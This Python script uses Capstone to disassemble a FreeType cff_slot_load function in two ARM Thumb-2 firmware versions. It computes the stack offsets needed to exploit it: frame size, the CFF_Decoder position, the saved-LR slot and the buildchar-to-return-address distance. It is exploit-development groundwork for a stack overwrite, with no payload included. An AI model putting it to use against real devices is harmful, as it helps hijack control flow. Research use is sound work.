#!/usr/bin/env python3
"""Disassemble a Thumb-2 function and extract the exploit-relevant stack layout
of cff_slot_load: total frame size, the sp-offset where the CFF_Decoder struct
(0x324 bytes) is built, the sp-offset of the charstring pointer local, and the
saved-LR sp-offset. Runs identically on 1.0.4 and 1.1.2 so the method can be
validated against the known 1.1.2 constants before trusting the 1.0.4 output.
"""
import sys, struct
from capstone import Cs, CS_ARCH_ARM, CS_MODE_THUMB, CS_MODE_LITTLE_ENDIAN
from capstone.arm import ARM_OP_IMM, ARM_OP_REG, ARM_OP_MEM, ARM_REG_SP, ARM_REG_LR

BASE = 0x08000000

def load(path):
    return open(path, "rb").read()

def disasm(data, addr, n=0x600):
    md = Cs(CS_ARCH_ARM, CS_MODE_THUMB | CS_MODE_LITTLE_ENDIAN)
    md.detail = True
    off = addr - BASE
    return list(md.disasm(data[off:off+n], addr))

def analyze(data, addr, label):
    ins = disasm(data, addr)
    print(f"\n==== {label}: cff_slot_load @ {addr:#x} ====")
    frame = 0            # bytes subtracted from sp (sub sp, #imm [+ push])
    push_bytes = 0
    sub_imm = 0
    decoder_sp = None    # sp offset of &CFF_Decoder (arg to the 0x324 memset)
    charstr_sp = None
    # track: reg = sp + imm  (add rX, sp, #imm)  -> sp_alias[rX] = imm
    sp_alias = {}
    movw_val = {}        # reg -> last immediate loaded (mov/movw/movs)
    for i, I in enumerate(ins[:220]):
        m = I.mnemonic
        ops = I.operands
        # prologue push {..., lr}
        if m.startswith("push") or (m == "stmdb" and "sp!" in I.op_str):
            n = I.op_str.count(",") + 1
            # count registers inside braces
            inside = I.op_str[I.op_str.find("{")+1:I.op_str.find("}")]
            regs = [r.strip() for r in inside.split(",") if r.strip()]
            # expand ranges like r4-r11
            cnt = 0
            for r in regs:
                if "-" in r:
                    a,b = r.split("-")
                    cnt += (int(b[1:]) - int(a[1:]) + 1)
                else:
                    cnt += 1
            push_bytes += cnt*4
            has_lr = "lr" in inside
        mb = m.split(".")[0]   # strip .w / .n
        if mb in ("sub","subw") and ops and ops[0].type==ARM_OP_REG and ops[0].reg==ARM_REG_SP \
           and ops[-1].type==ARM_OP_IMM:
            sub_imm += ops[-1].imm
        # add/addw rX, sp, #imm   (rX := sp + imm)
        if mb in ("add","addw") and len(ops)>=3 and ops[0].type==ARM_OP_REG and \
           ops[1].type==ARM_OP_REG and ops[1].reg==ARM_REG_SP and ops[2].type==ARM_OP_IMM:
            sp_alias[ops[0].reg] = ops[2].imm
        # track immediates for size/arg regs
        if mb in ("mov","movs","movw","movt") and ops and ops[0].type==ARM_OP_REG and ops[-1].type==ARM_OP_IMM:
            if mb=="movt":
                movw_val[ops[0].reg] = movw_val.get(ops[0].reg,0) | (ops[-1].imm<<16)
            else:
                movw_val[ops[0].reg] = ops[-1].imm
        # a bl where some arg reg currently aliases sp and another reg == 0x324 => decoder init
        if m == "bl":
            # r0 is the dest buffer by AAPCS; see if r0 aliases sp and r1==0x324
            from capstone.arm import ARM_REG_R0, ARM_REG_R1
            if decoder_sp is None and ARM_REG_R0 in sp_alias and movw_val.get(ARM_REG_R1)==0x324:
                decoder_sp = sp_alias[ARM_REG_R0]
            sp_alias.clear();
    total = push_bytes + sub_imm
    print(f"push_bytes={push_bytes:#x} sub_imm={sub_imm:#x} total_frame={total:#x}")
    print(f"decoder_struct @ sp+{decoder_sp:#x}" if decoder_sp is not None else "decoder_struct: NOT FOUND (size-0x324 memset not matched)")
    # saved LR is at top of frame: sp(after) + total - 4  (push stored it just below entry sp)
    lr_sp = total - 4
    print(f"saved_LR @ sp+{lr_sp:#x} (= total_frame-4)")
    if decoder_sp is not None:
        buildchar_sp = decoder_sp + 0x11c   # pivot is a fixed FreeType offset into the decoder
        print(f"buildchar(decoder+0x11c) @ sp+{buildchar_sp:#x}")
        print(f"=> OFFSET_LR  = (lr_sp - buildchar_sp)/4 = {(lr_sp-buildchar_sp)//4}")
    return dict(total=total, decoder_sp=decoder_sp, lr_sp=lr_sp)

if __name__ == "__main__":
    # args: <111_bin> <111_cff_slot_load> [<104_bin> <104_cff_slot_load>]
    d111 = load(sys.argv[1]); analyze(d111, int(sys.argv[2],16), "1.1.2 (reference)")
    if len(sys.argv) > 4:
        d104 = load(sys.argv[3]); analyze(d104, int(sys.argv[4],16), "1.0.4")
